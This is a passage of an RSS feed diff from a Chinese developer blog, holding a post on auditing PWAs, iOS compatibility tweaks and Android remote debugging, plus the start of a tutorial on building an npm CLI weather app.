+&lt;p&gt;使用 &lt;a href=&quot;https://github.com/GoogleChrome/lighthouse&quot;&gt;Lighthouse&lt;/a&gt; 工具可以对 PWA 应用进行审计，以检查当前的 PWA 是否正常。此插件可以在 Chrome 浏览器进行安装，安装完成后，在浏览器中输入 PWA 应用的地址，点击 Lighthouse 插件进行审计工作。&lt;/p&gt;
+
+&lt;p&gt;这里我使用我的博客站点进行测试，最后生成的报告如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/lighthouse.png&quot; alt=&quot;lighthouse&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从上述的报告中可以看到，当前 https://vinny.cc 的站点对于 PWA 应用支持的得分为 91，除了有一个问题，就是无法从 HTTP 请求转向到 HTTPS 请求。&lt;/p&gt;
+
+&lt;h2 id=&quot;附录a-不同浏览器对-pwa-应用缓存的限制&quot;&gt;附录A 不同浏览器对 PWA 应用缓存的限制&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;浏览器&lt;/th&gt;
+      &lt;th&gt;限制&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Chrome&lt;/td&gt;
+      &lt;td&gt;可用空间 &amp;lt; 6%&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;FireFox&lt;/td&gt;
+      &lt;td&gt;可用空间 &amp;lt; 10%&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Safari&lt;/td&gt;
+      &lt;td&gt;可用空间 &amp;lt; 50MB&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;IE10&lt;/td&gt;
+      &lt;td&gt;可用空间 &amp;lt; 250MB&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;附录b-pwa在ios中的问题与解决方法&quot;&gt;附录B PWA在IOS中的问题与解决方法&lt;/h2&gt;
+
+&lt;p&gt;IOS在11.3开始支持PWA应用，但兼容性仍然不能达到理想，现阶段智能调用有限的 API，具体主要表现为以下几个问题：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;无法后台同步，也就无法进行消息推送&lt;/li&gt;
+  &lt;li&gt;不支持全屏显示&lt;/li&gt;
+  &lt;li&gt;无法锁定PWA应用方向，竖屏还是横屏&lt;/li&gt;
+  &lt;li&gt;无法改变状态栏颜色&lt;/li&gt;
+  &lt;li&gt;没有启动动画&lt;/li&gt;
+  &lt;li&gt;不支持透明图标&lt;/li&gt;
+  &lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;当然某些问题是可以解决的，如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;桌面图标&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;IOS 的 Safari 浏览器暂时不支持读取 manifest.json 文件的 icon 配置信息，当添加到桌面时，只是页面的缩略图，对用户不是很友好，具体的改善步骤为，在 index.html 中的 head 标签内添加适配信息&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;https://www.netguru.co/hs-fs/hubfs/white_splash_small.gif?t=1526027228428&amp;amp;width=300&amp;amp;height=537&amp;amp;name=white_splash_small.gif&quot; style=&quot;height:300px;margin:0 auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-96x96.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;152x152&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-152x152.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;180x180&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-180x180.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;167x167&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/assets/icons/icon-167x167.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;启动页面&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;IOS 在启动 PWA应用时，启动页面默认是黑屏或者白屏，对于这个问题可以在 &lt;a href=&quot;https://developer.apple.com/library/content/documentation/AppleApplications/Reference/SafariWebContent/ConfiguringWebApplications/ConfiguringWebApplications.html&quot;&gt;apple developer’s page&lt;/a&gt; 找到解决方案，通过加入 &lt;strong&gt;apple-touch-startup-image&lt;/strong&gt; 标签解决，如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-mobile-web-app-capable&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-mobile-web-app-capable&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yes&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-mobile-web-app-status-bar-style&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;black&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_2048.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2048x2732&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1668.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1668x2224&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1536.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1536x2048&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1125.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1125x2436&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_1242.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1242x2208&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_750.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;750x1334&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apple_splash_640.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;sizes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;640x1136&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apple-touch-startup-image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;不支持弹出”Add to home screen”的横幅&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;在 Android 系统中，会弹出横幅鼓励用户将 PWA应用 添加到主屏幕中。但是在 IOS 系统中不会有次横幅弹出，想要添加到主屏，需要三个步骤。&lt;/p&gt;
+
+&lt;p&gt;对于这种方式增加到主屏肯定是不友好的，建议设计一个弹出层，以友好的方式提示用户将 PWA 应用添加到主屏中，这里需要注意的是，弹出层需要检查当前 PWA 应用是否是 &lt;strong&gt;window.navigator.standalone&lt;/strong&gt; 的情况。&lt;/p&gt;
+
+&lt;p style=&quot;text-align:center;&quot;&gt;
+
+&lt;img src=&quot;https://www.netguru.co/hs-fs/hubfs/add_to_homescreen_small.gif?t=1526027228428&amp;amp;width=300&amp;amp;name=add_to_homescreen_small.gif&quot; style=&quot;height:300px;&quot; /&gt;
+
+&lt;img src=&quot;https://www.netguru.co/hs-fs/hubfs/Simulator%20Screen%20Shot%20-%20iPhone%206s%20-%202018-04-04%20at%2010.14.00.png?t=1526027228428&amp;amp;width=300&amp;amp;height=534&amp;amp;name=Simulator%20Screen%20Shot%20-%20iPhone%206s%20-%202018-04-04%20at%2010.14.00.png&quot; style=&quot;height:300px;&quot; /&gt;
+
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;关于导航的问题&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;当在 IOS 下运行 PWA 应用时，若处于 &lt;strong&gt;standalone&lt;/strong&gt; 模式时，由于苹果手机没有返回的按键，因此在设计应用界面时需要确保用户有返回控制键以及可以从任何位置返回到主页上。&lt;/p&gt;
+
+&lt;p&gt;这你可以通过显示后退按钮或者在IOS尚添加更多的菜单栏来实现。&lt;/p&gt;
+
+&lt;h2 id=&quot;附录c-实验中的pwa应用参考&quot;&gt;附录C 实验中的PWA应用参考&lt;/h2&gt;
+
+&lt;p&gt;关于 PWA应用 的完善版，可以参考本站点 &lt;a href=&quot;https://vinny.cc&quot;&gt;vinny.cc&lt;/a&gt; 的实现，关键的文件如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://vinny.cc/manifest.json&quot;&gt;https://vinny.cc/manifest.json&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://vinny.cc/assets/main.js&quot;&gt;https://vinny.cc/assets/main.js&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://vinny.cc/service-worker.js&quot;&gt;https://vinny.cc/service-worker.js&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;附录d-如何对pwa进行远程调试&quot;&gt;附录D 如何对PWA进行远程调试&lt;/h2&gt;
+
+&lt;p&gt;这里的环境是使用Android系统的真机进行 PWA 应用的调试&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;手机的设置中打开 &lt;strong&gt;USB调试模式&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用USB线接入电脑或者在手机上安装 ADB 远程调试工具，如 网络adb&lt;/p&gt;
+
+    &lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/14822209063612928.png&quot; style=&quot;height:300px;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;若使用 远程adb 的方式，则如要使用如下命令建立连接：&lt;/p&gt;
+
+    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adb connect 192.168.1.198:5555
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adb devices
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在电脑上打开 Chrome 浏览器并打开开发者工具，打开 Remote devices 应可以看见已连接上的Android设备&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/pwa_debug-1.png&quot; alt=&quot;pwd-debug-1&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在手机中打开 PWA应用，在浏览器开发者工具中就可以看见并进行调试&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/pwa_debug-2.png&quot; alt=&quot;pwd-debug-2&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;另外如果 &lt;strong&gt;PWA应用&lt;/strong&gt; 部署在本地，可以通过chrome浏览器的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Port forwarding&lt;/code&gt; 功能将本地 &lt;strong&gt;PWA应用&lt;/strong&gt; 映射到手机上，这样在手机中输入”localhost:8887”即可在调试中出现。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/pwa_debug-3.png&quot; alt=&quot;pwa_debug-3&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;参考文章&quot;&gt;参考文章&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&quot;&gt;https://www.netguru.co/codestories/few-tips-that-will-make-your-pwa-on-ios-feel-like-native&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/app-install-banners/&quot;&gt;https://developers.google.com/web/fundamentals/app-install-banners/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/primers/service-workers/&quot;&gt;https://developers.google.com/web/fundamentals/primers/service-workers/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&quot;&gt;https://developers.google.com/web/tools/lighthouse/?hl=zh-cn&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>  
+               <pubDate>Fri, 11 May 2018 00:00:00 +0800</pubDate>  
+               <link>http://www.vinny.cc/2018/05/pwa-app/</link>  
+               <guid isPermaLink="true">http://www.vinny.cc/2018/05/pwa-app/</guid>  
+               </item>  
+          
+            <item>  
+               <title>从零开始创建并发布NPM Cli的应用</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-背景&quot; id=&quot;markdown-toc-1-背景&quot;&gt;1. 背景&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-前提&quot; id=&quot;markdown-toc-2-前提&quot;&gt;2. 前提&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-hello-world&quot; id=&quot;markdown-toc-3-hello-world&quot;&gt;3. Hello World&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-1-创建工程基本结构&quot; id=&quot;markdown-toc-3-1-创建工程基本结构&quot;&gt;3. 1 创建工程基本结构&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#32-创建一个bin文件&quot; id=&quot;markdown-toc-32-创建一个bin文件&quot;&gt;3.2 创建一个Bin文件&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-气温应用&quot; id=&quot;markdown-toc-4-气温应用&quot;&gt;4. 气温应用&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#41-命令行参数&quot; id=&quot;markdown-toc-41-命令行参数&quot;&gt;4.1 命令行参数&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#42-运行命令&quot; id=&quot;markdown-toc-42-运行命令&quot;&gt;4.2 运行命令&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#43-预期与容错&quot; id=&quot;markdown-toc-43-预期与容错&quot;&gt;4.3 预期与容错&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#44-进度与请求&quot; id=&quot;markdown-toc-44-进度与请求&quot;&gt;4.4 进度与请求&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#45-错误与退出码&quot; id=&quot;markdown-toc-45-错误与退出码&quot;&gt;4.5 错误与退出码&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#5-发布到npm仓库&quot; id=&quot;markdown-toc-5-发布到npm仓库&quot;&gt;5. 发布到NPM仓库&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;1-背景&quot;&gt;1. 背景&lt;/h2&gt;
+
+&lt;p&gt;当下 javascript 大行其道，无论从传统web、手机端还是桌面程序，javacsript 无所不能。ES6 的定义 以及 nodejs 大大推动了 javascript 的发展。而大部分的应用都离不开 &lt;strong&gt;npm&lt;/strong&gt;，很多应用都使用 nodejs cli 的方式进行初始化等操作。&lt;/p&gt;
+
+&lt;p&gt;本篇文章将创建一个简单的 &lt;strong&gt;nodejs cli&lt;/strong&gt; 的气温应用，以便熟悉如何自己创建 &lt;strong&gt;cli&lt;/strong&gt; 命令行程序。&lt;/p&gt;
+
+&lt;h2 id=&quot;2-前提&quot;&gt;2. 前提&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;安装好 nodejs 环境&lt;/li&gt;
+  &lt;li&gt;具有 javascript 编程经验，最好熟悉 ES5 或者 ES6 的规范&lt;/li&gt;
+  &lt;li&gt;好的编辑器，比如 visual code 后者 sublime&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-hello-world&quot;&gt;3. Hello World&lt;/h2&gt;
+
+&lt;h3 id=&quot;3-1-创建工程基本结构&quot;&gt;3. 1 创建工程基本结构&lt;/h3&gt;
+
+&lt;p&gt;和很多 javascript 工程一样，需要一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;package.json&lt;/code&gt; 文件以及一个入口的 &lt;code class=&quot;highlighter-rouge&quot;&gt;index.js&lt;/code&gt; 文件，这里强调简单的应用，所以尽量不做过多依赖库。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[package.json]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;weather-cli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Welcome to the weather app!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;32-创建一个bin文件&quot;&gt;3.2 创建一个Bin文件&lt;/h3&gt;
+
+&lt;p&gt;我们需要一种方法来调用新开发的 javascript 程序并显示欢迎信息，并将其加入到系统路径中，以便在任何地方都可以调用它，bin 文件是实现此目的的好方法。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[bin/weather]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env node&lt;/span&gt;
+require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;使用 bin 文件运行程序，使用命令 &lt;code class=&quot;highlighter-rouge&quot;&gt;cd bin&lt;/code&gt; 进入bin目录，并给 &lt;strong&gt;weather&lt;/strong&gt; 文件赋予执行权限 &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod u+x ./weather&lt;/code&gt;，直接执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;./weather&lt;/code&gt; 就可以显示欢迎信息。&lt;/p&gt;
+
+&lt;p&gt;但这不是我们想要的，我们需要在任何路径下都可以执行，也就是使用 npm 全局安装的方式 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install -g weather&lt;/code&gt;，所以需要将 bin 文件配置到 package.json 中。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[package.json]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
